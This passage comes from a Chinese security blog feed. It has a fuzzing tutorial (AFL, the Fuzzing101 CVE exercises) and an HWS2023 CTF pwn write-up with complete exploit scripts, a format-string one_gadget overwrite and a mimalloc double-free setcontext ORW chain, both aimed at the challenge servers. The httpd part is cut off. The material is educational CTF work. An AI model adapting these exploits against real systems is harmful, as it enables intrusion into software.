class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv, <span class="hljs-type">char</span> *envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;welcome to korey0sh1&#x27;s AFL test!!&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pls input your content: &quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x100</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">gets</span>(buf);<br>    <span class="hljs-built_in">test</span>(buf);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>分别用gcc和afl-gcc编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc ./test.c -o <span class="hljs-built_in">test</span><br>/path/to/afl-gcc ./test.c -o afl_test<br></code></pre></td></tr></table></figure><p>然后用ida打开看看这两个elf文件有什么不同</p><p><img src="/img/Fuzz0/0.png" alt="img"></p><p>可以看到afl_test里面出现了许多奇怪的东西，这其实就是afl-gcc在编译时对测试源码进行了插桩（主要是**__afl_maby_log**函数）</p><p>这些被插入的桩总的来讲类似于传感器，实现对branch、edge（分支、边缘）覆盖率的捕获和分支点的统计，在后续的fuzz测试中会根据这些反馈信息进行新的路径探索和测试。（其实铸币笔者也刚刚在看afl源码，又回到了被源码支配的日子了呜呜呜）</p><p>接下来可以试着来真正fuzz一下这个test</p><p>先搞两个空文件夹存放输入样例和输出样例，fuzz_in里面touch 一个testcase随便写点什么。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> fuzz_in<br><span class="hljs-built_in">mkdir</span> fuzz_out<br><br>/path/to/afl-fuzz -i fuzz_in/ -o fuzz_out/ ./afl_test<br></code></pre></td></tr></table></figure><p>第一次尝试可能会报错需要设置一下core_pattern</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">su root<br>echo &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>core_pattern<br></code></pre></td></tr></table></figure><p>然后就可以愉快的afl_fuzz啦</p><p>进去后可以看到这样一个界面，相信大家英文都比我好，各种参数的含义korey看得懂得各位看官老爷也一定看懂嘻嘻。</p><p><img src="/img/Fuzz0/1.png" alt="img"></p><p>由于铸币笔者只能用垃圾笔记本跑（乐色13900h），所以跑了大概一个小时跑出来了8个crash</p><p>接下来便是进到fuzz_out中看看每个crash是什么样的</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">用：<br>xxd <span class="hljs-selector-attr">[the name of crash]</span><br>可以查看触发crash的输入<br></code></pre></td></tr></table></figure><p><img src="/img/Fuzz0/2.png" alt="img"></p><p>crash0满足了buf[0] &#x3D; ‘A’且len &#x3D; 6</p><p>crash1满足了buf[1] &#x3D; ‘F’且len &#x3D; 66</p><p>crash2因为gets函数造成了栈溢出</p><p>遗憾的是buf[2] &#x3D; ‘L’且len &#x3D; 666的crash并未触发</p><p>之后便可以使用gdb将test文件和crash样例组合调试</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gdb ./test<br><span class="hljs-built_in">run</span> &lt; [the name of crash]<br></code></pre></td></tr></table></figure><p><img src="/img/Fuzz0/3.png" alt="img"></p><p>用bt回溯可以看到stack smashing，造成栈溢出了</p><h1 id="0x2-Fuzzing-101"><a href="#0x2-Fuzzing-101" class="headerlink" title="0x2:Fuzzing 101"></a>0x2:Fuzzing 101</h1><p>这是个github上的<a href="https://github.com/antonio-morales/Fuzzing101">项目</a>，专门来帮助那些想要把fuzz应用于实战的带手子们。</p><p>项目中有十分详细的步骤，笔者就不在此赘述。笔者仅在此记录一些收获</p><h2 id="exercise-1-Xpdf"><a href="#exercise-1-Xpdf" class="headerlink" title="exercise 1:Xpdf"></a>exercise 1:Xpdf</h2><p>第一个example是 <a href="https://www.cvedetails.com/cve/CVE-2019-13288/">CVE-2019-13288</a></p><p>在version 4.01.01的xpdf中，Parser.cc中的Parser::getObj()函数将会被无限调用导致内存耗尽，最终使程序崩溃，达到DoS攻击的效果。</p><p>感觉afl++比afl好用点</p><p>【-M】：主fuzzer，配合【-S】多开从属fuzzer效率可以提高</p><p>当输入为文件时，需要使用【@@】，否则为标准输入</p><p>插桩完后恢复成正常的gcc编译</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">CFLAGS</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span> CXXFLAGS<span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span><br></code></pre></td></tr></table></figure><h2 id="exercise-2-libexif"><a href="#exercise-2-libexif" class="headerlink" title="exercise 2:libexif"></a>exercise 2:libexif</h2><p>在version 0.6.14 的libexif中，存在heap buffer overflow <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3895">CVE-2009-3895</a>以及out-of-bounds read<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2836">CVE-2012-2836</a></p><p>这边插桩时使用的是<strong>afl-clang-lto</strong></p><p>但libexif只是一个解析、保存、编辑exif数据的库，所以还要有相应的可执行文件（exif，编译的时候制定一下链接库文件夹）才能正常实现功能</p><p>就最后的调试而言，项目中使用的eclipse，具有图形化界面，笔者还是GDB用的习惯，直接</p><p><strong>gdb –args</strong> 指定参数就行了</p><p><img src="/img/Fuzz0/4.png" alt="img"></p><h2 id="exercise-3-tcpdump"><a href="#exercise-3-tcpdump" class="headerlink" title="exercise 3:tcpdump"></a>exercise 3:tcpdump</h2><p>目前为止最折磨的一集</p><p>在version 4.9.2的 Tcpdump中，BOOTP协议数据包可以触发out-of-bouds Read，其实也算是overflow的一种 <a href="https://www.cvedetails.com/cve/CVE-2017-13028/">CVE-2017-13028</a></p><p>这次采用速度更快的afl-clang-lto（但nmd还是fuzz了10个小时才出来8个crash，不过一看hollk师傅的博客，用afl-clang-fast15个小时出一个crash，心里突然平衡了一点）</p><p>且在编译tcpdump和所对应的动态链接库时，加入了ASAN选项</p><p><strong>ASAN（Address Sanitizer）是针对 C&#x2F;C++ 的快速内存错误检测工具，在运行时检测 C&#x2F;C++ 代码中的多种内存错误</strong></p><p>铸币笔者也不是很懂，附带一个官方说明书<a href="https://clang.llvm.org/docs/AddressSanitizer.html">AddressSanitizer — Clang 18.0.0git documentation (llvm.org)</a></p><p>后面执行运行tcpdump就能直接看到报错，感觉还是挺方便的，就是ASAN运行时所需内存有点大，fuzz的时候要加上 <strong>-m none</strong> 的参数解除内存限制</p><p>贴个图意思一下</p><p><img src="/img/Fuzz0/6.png" alt="img"></p><p><img src="/img/Fuzz0/7.png" alt="img"></p><h2 id="exercise-4-LibTiff"><a href="#exercise-4-LibTiff" class="headerlink" title="exercise 4:LibTiff"></a>exercise 4:LibTiff</h2><p>逐渐熟练，笑</p><p>前面还是用ASAN和AFL++进行一个fuzz操作</p><p>在此次exercise中，项目作者用到了<strong>lcov</strong>，一个基于<strong>GCC</strong>代码覆盖测试工具<strong>gcov</strong>的图形前端</p><p>在编译的时候</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">CFLAGS</span>=<span class="hljs-string">&quot;--coverage&quot;</span> <span class="hljs-attribute">LDFLAGS</span>=<span class="hljs-string">&quot;--coverage&quot;</span> <br></code></pre></td></tr></table></figure><p>编译完成后，进入tiff文件夹</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 重置计数器</span><br>lcov <span class="hljs-params">--zerocounters</span> <span class="hljs-params">--directory</span> <span class="hljs-string">./</span><br><span class="hljs-comment"># 返回包含每个插桩代码行零覆盖率的基于行的覆盖率数据文件</span><br>lcov <span class="hljs-params">--capture</span> <span class="hljs-params">--initial</span> <span class="hljs-params">--directory</span> <span class="hljs-string">./</span> <span class="hljs-params">--output-file</span> app.info<br><span class="hljs-comment"># 运行程序</span><br>$HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w $HOME/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff<br><span class="hljs-comment"># 将当前状态覆盖状态保存到【app2.info】文件中</span><br>lcov <span class="hljs-params">--no-checksum</span> <span class="hljs-params">--directory</span> <span class="hljs-string">./</span> <span class="hljs-params">--capture</span> <span class="hljs-params">--output-file</span> app2.info<br></code></pre></td></tr></table></figure><p>笔者这边把前10个crash试了试，感觉代码覆盖率不是很理想</p><p><img src="/img/Fuzz0/8.png" alt="img"></p><h2 id="exercise-5-LibXml2"><a href="#exercise-5-LibXml2" class="headerlink" title="exercise 5:LibXml2"></a>exercise 5:LibXml2</h2><p>难绷，crash出不来就出不来吧</p><p><img src="/img/Fuzz0/9.png" alt="img"></p><p>第一次完全没有看项目里的solution，自己解决，编译的时候看缺了个Python.h的头文件还自己编译了一个python（笑哭），好在最后成功跑起来了。</p><p>【 <strong>-x</strong> 】：指定字典</p><p>【 <strong>-D</strong> 】: 确定性突变</p><p>ASAN真好用，嘿嘿嘿嘿</p><h2 id="exercise-6-GIMP"><a href="#exercise-6-GIMP" class="headerlink" title="exercise 6:GIMP"></a>exercise 6:GIMP</h2><p>寄，我也不知道为什么fuzz101提供的demo会直接crash，怎么直接会有memory leak啊</p><p><img src="/img/Fuzz0/10.png" alt="img"></p><p>试了好几个xcf文件都是这样</p><h2 id="exercise-7-VLC"><a href="#exercise-7-VLC" class="headerlink" title="exercise 7: VLC"></a>exercise 7: VLC</h2><p>更抽象的一集</p><h2 id="exercise-8-Adobe-Reader"><a href="#exercise-8-Adobe-Reader" class="headerlink" title="exercise 8: Adobe Reader"></a>exercise 8: Adobe Reader</h2><p>无源码直接fuzzelf文件</p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HWS2023</title>
    <link href="/2023/07/17/HWS2023/"/>
    <url>/2023/07/17/HWS2023/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>很难评价这次的HWS，还以为会有固件、Iot和kernel，白准备了。</p><p>Misc和Crypto真的pwn手坐大牢，只能各挑软柿子捏了。</p><h1 id="0x1-The-WriteUp-of-Pwn"><a href="#0x1-The-WriteUp-of-Pwn" class="headerlink" title="0x1:The WriteUp of Pwn"></a>0x1:The WriteUp of Pwn</h1><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>最标准的栈上格式化字符串</p><p>泄露出栈地址和libc基址后改ret_addr为ogg一把梭就好了</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs css"># -*- coding: UTF-<span class="hljs-number">8</span> -*-<br>from pwn import *<br>import sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>flag=<span class="hljs-number">1</span><br>if flag:<br>    p = <span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;60.204.140.184&#x27;</span>, <span class="hljs-number">30030</span>)<br>else:<br>    p = <span class="hljs-built_in">process</span>(<span class="hljs-string">&#x27;./fmt&#x27;</span>)<br>sa = lambda s,n : p.<span class="hljs-built_in">sendafter</span>(s,n)<br>sla = lambda s,n : p.<span class="hljs-built_in">sendlineafter</span>(s,n)<br>sl = lambda s : p.<span class="hljs-built_in">sendline</span>(s)<br>sd = lambda s : p.<span class="hljs-built_in">send</span>(s)<br>rc = lambda n : p.<span class="hljs-built_in">recv</span>(n)<br>ru = lambda s : p.<span class="hljs-built_in">recvuntil</span>(s)<br>ti = lambda : p.<span class="hljs-built_in">interactive</span>()<br>leak = lambda name,addr :log.<span class="hljs-built_in">success</span>(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><br>payload = b<span class="hljs-string">&#x27;%10$p%18$p%19$p&#x27;</span><br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&#x27;: &#x27;</span>,payload)<br><br><span class="hljs-built_in">ru</span>(b<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stderr_&#x27;</span>]<br><span class="hljs-built_in">ru</span>(b<span class="hljs-string">&#x27;0x&#x27;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x10<br><span class="hljs-built_in">ru</span>(b<span class="hljs-string">&#x27;0x&#x27;</span>)<br>code_base = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x13e2<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;libc.address&quot;</span>,libc.address)<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;stack&quot;</span>,stack_addr)<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;code_base&quot;</span>,code_base)<br><br>gadget = [<span class="hljs-number">0</span>xe3afe,<span class="hljs-number">0</span>xe3b01,<span class="hljs-number">0</span>xe3b04]<br>one_gadget = libc.address + gadget[<span class="hljs-number">1</span>]<br>target = stack_addr +<span class="hljs-number">0</span>x18<br>low = one_gadget &amp; <span class="hljs-number">0</span>xffff<br>high = (one_gadget &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0</span>xffff<br><br><br>payload = b<span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(low).<span class="hljs-built_in">encode</span>( )+ b<span class="hljs-string">&#x27;c%10$hn&#x27;</span><br>payload += b<span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(high-low).<span class="hljs-built_in">encode</span>() + b<span class="hljs-string">&#x27;c%11$hn&#x27;</span><br>payload = payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>x20,b<span class="hljs-string">&#x27;a&#x27;</span>)<br>payload += <span class="hljs-built_in">p64</span>(target) + <span class="hljs-built_in">p64</span>(target+<span class="hljs-number">2</span>)<br><br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&#x27;: &#x27;</span>,payload)<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;onegadget&quot;</span>,one_gadget)<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;low&quot;</span>,low)<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;high&quot;</span>,high)<br>p.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><h2 id="mi"><a href="#mi" class="headerlink" title="mi"></a>mi</h2><p>第一次做mi_malloc的题，刚开始在ubuntu20里找不到libmimalloc2.0的安装包，后来问了xtx师傅直接用patchelf中的”–add-needed”选项直接把libmimalloc.so和libpthread.so给patch进去就好了。</p><p>因为有free后指针未置0，且mimalloc用来分配heap的头部可以泄露出libmimalloc的基地址，libmimalloc的基地址与libc的偏移固定，因此可以得到libc。</p><p>通过观察mi_malloc函数，发现存在deferred_free这个类似malloc_hook的函数，且位于deferred_free-0x8处的deferred_arg为可控的rdx，于是可以直接setcontext进行orw，堆栈结合太麻烦了。</p><p><img src="/img/HWS2023/0.png" alt="img"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs vim">import lib2to3.pgen2.tokenize<br><br>from pwn import *<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>libmimalloc = ELF(<span class="hljs-string">&quot;./libmimalloc.so.2&quot;</span>)<br><br><span class="hljs-keyword">p</span> = remote(<span class="hljs-string">&quot;123.60.179.52&quot;</span>,<span class="hljs-number">30208</span>)<br><span class="hljs-keyword">sa</span> = lambda s,n : <span class="hljs-keyword">p</span>.sendafter(s,n)<br><span class="hljs-keyword">sla</span> = lambda s,n : <span class="hljs-keyword">p</span>.sendlineafter(s,n)<br><span class="hljs-keyword">sl</span> = lambda s : <span class="hljs-keyword">p</span>.sendline(s)<br>sd = lambda s : <span class="hljs-keyword">p</span>.send(s)<br>rc = lambda n : <span class="hljs-keyword">p</span>.recv(n)<br><span class="hljs-keyword">ru</span> = lambda s : <span class="hljs-keyword">p</span>.recvuntil(s)<br>ti = lambda : <span class="hljs-keyword">p</span>.interactive()<br>leak = lambda name,addr :<span class="hljs-built_in">log</span>.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+hex(addr))<br><br><span class="hljs-keyword">menu</span> = <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;:\n&#x27;</span><br>def <span class="hljs-built_in">add</span>(size,content):<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;1&#x27;</span>)<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">menu</span>,str(size).encode())<br>    <span class="hljs-keyword">sa</span>(<span class="hljs-keyword">menu</span>,content)<br><br>def <span class="hljs-keyword">delete</span>(idx):<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;2&#x27;</span>)<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">menu</span>,str(idx).encode())<br><br>def <span class="hljs-keyword">edit</span>(idx,content):<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;3&#x27;</span>)<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">menu</span>,str(idx).encode())<br>    <span class="hljs-keyword">sa</span>(<span class="hljs-keyword">menu</span>,content)<br><br>def show(idx):<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;4&#x27;</span>)<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">menu</span>,str(idx).encode())<br><br>def pwn():<br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x40, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span>x40)  # <span class="hljs-number">0</span><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x40, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span>x40)  # <span class="hljs-number">1</span><br><br>    show(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span>x40)<br>    heap_base = u64(<span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-keyword">b</span><span class="hljs-string">&quot;\x00&quot;</span>)) - <span class="hljs-number">0</span>x20140<br><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;aa&#x27;</span>)  # <span class="hljs-number">2</span><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;aa&#x27;</span>)  # <span class="hljs-number">3</span><br>    <span class="hljs-keyword">delete</span>(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">delete</span>(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">edit</span>(<span class="hljs-number">2</span>, p64(heap_base + <span class="hljs-number">0</span>x158))<br><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>x3):<br>        <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">0</span>x8)<br>    show(<span class="hljs-number">6</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">8</span>)<br>    libmimalloc.address = u64(<span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x00&#x27;</span>)) + <span class="hljs-number">0</span>x1f48c0<br>    libc.address = libmimalloc.address - <span class="hljs-number">0</span>x1f2000<br><br>    leak(<span class="hljs-string">&quot;heap_base&quot;</span>, heap_base)<br>    leak(<span class="hljs-string">&quot;libcmimalloc&quot;</span>, libmimalloc.address)<br>    leak(<span class="hljs-string">&quot;libc.address&quot;</span>, libc.address)<br><br>    deferred_free = libmimalloc.address + <span class="hljs-number">0</span>x75f50<br>    setcontext = libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span><br>    fake_rdx = heap_base + <span class="hljs-number">0</span>x30000<br>    pop_rdi = <span class="hljs-number">0</span>x0000000000023b6a + libc.address<br>    pop_rsi = <span class="hljs-number">0</span>x000000000002601f + libc.address<br>    pop_rdx = <span class="hljs-number">0</span>x0000000000142c92 + libc.address<br>    pop_rax = <span class="hljs-number">0</span>x0000000000036174 + libc.address<br>    syscall = <span class="hljs-number">0</span>x00000000000630a9 + libc.address<br>    <span class="hljs-keyword">ret</span> = <span class="hljs-number">0</span>x0000000000022679 + libc.address<br><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;c&#x27;</span> * <span class="hljs-number">8</span>)  # <span class="hljs-number">7</span><br>    <span class="hljs-keyword">delete</span>(<span class="hljs-number">7</span>)<br>    <span class="hljs-keyword">delete</span>(<span class="hljs-number">7</span>)<br>    <span class="hljs-keyword">edit</span>(<span class="hljs-number">7</span>, p64(deferred_free - <span class="hljs-number">0</span>x10))<br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;c&#x27;</span> * <span class="hljs-number">8</span>)<br><br><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, p64(<span class="hljs-number">0</span>) + p64(fake_rdx) + p64(setcontext))<br><br>    payload = <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;./flag\x00\x00&#x27;</span><br>    payload = payload.ljust(<span class="hljs-number">0</span>xa0, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(fake_rdx + <span class="hljs-number">0</span>xb0) + p64(<span class="hljs-keyword">ret</span>)<br><br>    orw = flat([<br>        pop_rdi, fake_rdx,<br>        pop_rsi, <span class="hljs-number">0</span>,<br>        pop_rdx, <span class="hljs-number">0</span>,<br>        pop_rax, <span class="hljs-number">2</span>,<br>        syscall,<br>        pop_rdi, <span class="hljs-number">3</span>,<br>        pop_rsi, fake_rdx + <span class="hljs-number">0</span>x1200,<br>        pop_rdx, <span class="hljs-number">0</span>x50,<br>        pop_rax, <span class="hljs-number">0</span>,<br>        syscall,<br>        pop_rdi, <span class="hljs-number">1</span>,<br>        pop_rax, <span class="hljs-number">1</span>,<br>        syscall<br>    ])<br><br>    <span class="hljs-keyword">edit</span>(<span class="hljs-number">2</span>, payload + orw)<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;1&#x27;</span>)<br><br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">menu</span>, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;1&#x27;</span>)<br><br>    <span class="hljs-keyword">p</span>.interactive()<br><br>pwn()<br></code></pre></td></tr></table></figure><h2 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h2><p>赛后看了下好像和vnctf2022的classic httpd挺像的</p><p>就是Authorization那里的base64有个栈溢出</p><p>可以构造htdocs&#x2F;..&#x2F;..&#x2F;..&#x2F;bin&#x2F;sh</p><p>然后再绕一下就能进入sub_0x2993执行execl（cmd,0）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 